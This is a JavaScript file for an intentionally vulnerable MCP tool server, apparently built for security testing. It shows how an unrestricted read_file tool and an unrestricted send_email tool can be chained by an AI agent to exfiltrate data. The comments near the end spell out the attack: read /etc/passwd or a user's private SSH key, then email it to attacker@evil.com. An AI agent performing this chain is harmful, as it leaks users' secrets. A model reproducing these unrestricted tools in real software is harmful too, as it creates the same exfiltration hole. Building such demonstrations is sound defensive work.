const http = require("http");
const fs = require("fs");
const nodemailer = require("nodemailer"); // would be installed in production

// MCP server with two tools that are individually safe but chain to exfiltrate data

const tools = [
  {
    name: "read_file",
    description: "Read the contents of a file from the local filesystem",
    inputSchema: {
      type: "object",
      properties: {
        path: { type: "string", description: "Absolute path to the file to read" },
      },
      required: ["path"],
    },
  },
  {
    name: "send_email",
    description: "Send an email to a specified recipient",
    inputSchema: {
      type: "object",
      properties: {
        to: { type: "string", description: "Recipient email address" },
        subject: { type: "string", description: "Email subject line" },
        body: { type: "string", description: "Email body content" },
      },
      required: ["to", "subject", "body"],
    },
  },
];

function handleReadFile(args) {
  // VULNERABLE: No path restriction -- can read any file the process has access to
  // Individually this seems fine for an agent that needs file access
  try {
    const content = fs.readFileSync(args.path, "utf-8");
    return { content: [{ type: "text", text: content }] };
  } catch (err) {
    return { content: [{ type: "text", text: `Error reading file: ${err.message}` }] };
  }
}

function handleSendEmail(args) {
  // VULNERABLE: No recipient restrictions -- can send to any email address
  // Individually this seems fine for an agent that needs to send notifications
  console.log(`[EMAIL] To: ${args.to}`);
  console.log(`[EMAIL] Subject: ${args.subject}`);
  console.log(`[EMAIL] Body: ${args.body.substring(0, 100)}...`);

  // In production this would actually send the email
  // const transporter = nodemailer.createTransport({ ... });
  // transporter.sendMail({ from: 'agent@company.com', to: args.to, subject: args.subject, text: args.body });

  return {
    content: [{ type: "text", text: `Email sent to ${args.to} with subject "${args.subject}"` }],
  };
}

// VULNERABILITY: The combination of read_file + send_email enables data exfiltration
// An attacker can chain: read_file(/etc/passwd) -> send_email(attacker@evil.com, contents)
// Neither tool individually violates security, but the chain does.
// No tool interaction policy prevents sensitive data from flowing to external outputs.

const server = http.createServer((req, res) => {
  if (req.method !== "POST") {
    res.writeHead(405);
    res.end();
    return;
  }

  let body = "";
  req.on("data", (chunk) => (body += chunk));
  req.on("end", () => {
    try {
      const request = JSON.parse(body);

      if (request.method === "tools/list") {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(
          JSON.stringify({
            jsonrpc: "2.0",
            id: request.id,
            result: { tools },
          })
        );
      } else if (request.method === "tools/call") {
        const toolName = request.params?.name;
        const args = request.params?.arguments || {};
        let result;

        switch (toolName) {
          case "read_file":
            result = handleReadFile(args);
            break;
          case "send_email":
            result = handleSendEmail(args);
            break;
          default:
            result = { content: [{ type: "text", text: `Unknown tool: ${toolName}` }] };
        }

        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(
          JSON.stringify({ jsonrpc: "2.0", id: request.id, result })
        );
      }
    } catch (err) {
      res.writeHead(400);
      res.end(JSON.stringify({ error: "Invalid request" }));
    }
  });
});

server.listen(3060, () => {
  console.log("MCP server (read_file + send_email) listening on port 3060");
});

// Attack chain:
// Step 1: Agent calls read_file({path: "/home/user/.ssh/id_rsa"})
// Step 2: Agent calls send_email({to: "attacker@evil.com", subject: "SSH Key", body: <file contents>})
// Result: Private SSH key exfiltrated via email
